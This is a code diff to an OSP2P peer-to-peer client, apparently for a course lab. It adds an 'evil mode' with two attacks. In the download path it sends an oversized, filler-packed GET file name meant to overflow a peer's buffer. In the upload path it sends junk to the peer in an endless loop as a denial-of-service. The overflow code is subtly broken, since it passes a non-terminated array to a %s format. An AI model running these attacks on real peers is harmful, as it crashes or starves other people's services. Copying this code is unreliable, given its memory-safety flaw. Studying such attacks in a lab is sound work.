@@ -525,6 +525,16 @@ static void task_download(task_t *t, task_t *tracker_task)
 		error("* Cannot connect to peer: %s\n", strerror(errno));
 		goto try_again;
 	}
+	// Evil Mode: buffer overflow attack
+	if (evil_mode)
+	{
+		int max_name_size = TASKBUFSIZ - 11;
+		// Send longest file name possible (minus the rest of the command)
+		char evil_name[max_name_size];
+		// Fill it up and "get" it
+		memset(evil_name, 1, max_name_size);
+		osp2p_writef(t->peer_fd, "GET %s OSPEP\n", evil_name);
+	}
 	osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
 
 	// Open disk file for the result.
@@ -649,6 +659,16 @@ static void task_upload(task_t *t)
 	}
 	t->head = t->tail = 0;
 
+	// Evil Mode: send them a bunch of useless junk, forever
+	if (evil_mode)
+	{
+		// Forever and ever
+		while (1)
+		{
+			osp2p_writef(t->peer_fd, "Muahahaha");
+		}
+	}
+	
 	t->disk_fd = open(t->filename, O_RDONLY);
 	if (t->disk_fd == -1) {
 		error("* Cannot open file %s", t->filename);
